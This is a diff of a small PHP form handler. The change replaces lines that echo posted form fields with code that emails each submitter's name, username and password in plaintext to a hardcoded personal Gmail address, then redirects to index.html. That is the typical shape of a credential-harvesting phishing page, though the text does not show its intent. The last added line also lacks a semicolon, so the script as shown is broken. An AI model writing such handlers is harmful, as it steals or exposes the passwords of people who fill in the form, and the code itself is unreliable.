@@ -8,20 +8,29 @@
 </head>
 <body>
 <?php 
-$fname = $_POST["fname"]; 
-echo $fname;
+ $fname = $_POST["fname"]; 
  $lname = $_POST["lname"]; 
- echo $lname;
+
  $uname = $_POST["uname"];
- echo $uname; 
+ 
  $pword= $_POST["pword"]; 
- echo $pword;
+
  $pnumber = $_POST["pnumber"];
- echo $pnumber;
+ 
  $gender = $_POST["gender"]; 
- echo $gender;
+ 
  $nline = $_POST["newline"];
- echo $nline;
+ $email_from = "";
+ $email_subject =" Submission Form ";
+ $email_body = " Name: $fname . $lname\n".
+                "Username: $uname\n".
+                "Password: $pword";
+
+ $to = "abiolaajibola955@gmail.com";
+ $header = "From: $email_from";
+
+ mail($to,$email_subject,$email_body);
+ header("Location: index.html")
  ?><br>
 
 </body>
